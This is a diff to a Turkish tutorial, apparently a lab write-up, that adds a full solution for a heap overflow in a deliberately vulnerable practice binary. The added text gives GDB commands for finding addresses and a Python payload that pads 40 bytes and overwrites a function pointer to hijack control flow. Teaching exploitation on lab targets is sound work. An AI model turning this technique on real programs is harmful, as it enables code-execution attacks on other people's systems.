@@ -154,6 +154,79 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+## Tam Çözüm (GDB ile Adres Bulma)
+
+### 1. GDB ile Adres Bulma
+
+```bash
+# Binary'yi GDB ile aç
+gdb ./compiled/zafiyetli_sunucu
+
+# Fonksiyon adreslerini bul
+(gdb) info functions
+(gdb) info functions basariMesaji
+(gdb) x/gx basariMesaji
+
+# Struct layout'ını incele
+(gdb) ptype KullaniciVerisi
+(gdb) p sizeof(KullaniciVerisi)
+
+# Heap overflow'u test et
+(gdb) break main
+(gdb) run
+(gdb) x/32gx kullanici
+(gdb) continue
+```
+
+### 2. Heap Overflow Exploit Oluşturma
+
+```python
+import struct
+
+# Adresleri GDB'den al
+TARGET_ADDRESS = 0x401146  # basariMesaji fonksiyonu
+PADDING_SIZE = 40  # kullanici_adi buffer boyutu
+
+# Payload oluştur
+padding = b'A' * PADDING_SIZE
+overwrite_address = struct.pack("<Q", TARGET_ADDRESS)
+payload = padding + overwrite_address
+
+# Exploit'i çalıştır
+with open("test_payload.bin", "wb") as f:
+    f.write(payload)
+
+# Programı çalıştır
+import subprocess
+result = subprocess.run(["./compiled/zafiyetli_sunucu"], 
+                       input=payload, 
+                       capture_output=True, 
+                       text=True)
+print(result.stdout)
+```
+
+### 3. Manuel Test
+
+```bash
+# Payload dosyasını oluştur
+python3 -c "
+import struct
+padding = b'A' * 40
+target = struct.pack('<Q', 0x401146)
+with open('test_payload.bin', 'wb') as f:
+    f.write(padding + target)
+"
+
+# Programı çalıştır
+./compiled/zafiyetli_sunucu < test_payload.bin
+```
+
+### 4. Beklenen Sonuç
+
+```
+>>> KONTROL ELE GECIRILDI!
+```
+
 Tam kodda dikkat edilmesi gereken kısım,
 ```python
 padding = b'A' * PADDING_SIZE
@@ -161,7 +234,5 @@ overwrite_address = struct.pack("<Q", TARGET_ADDRESS)
 payload = padding + overwrite_address
 ```
 Yani burada payload'ı oluşturuyoruz ve aslında tüm olay burada bitiyor. Sömürü kodumuzu yazmamızın ardından şöyle bir mesaj almalıyız.
-
-<img width="492" height="299" alt="resim" src="https://github.com/user-attachments/assets/496fbc26-b200-4ee9-b62e-37bcbcad45ad" />
 
 Okuduğunuz için teşekkür ederim. Sorularınızı yorumlarda belirtebilirsiniz.
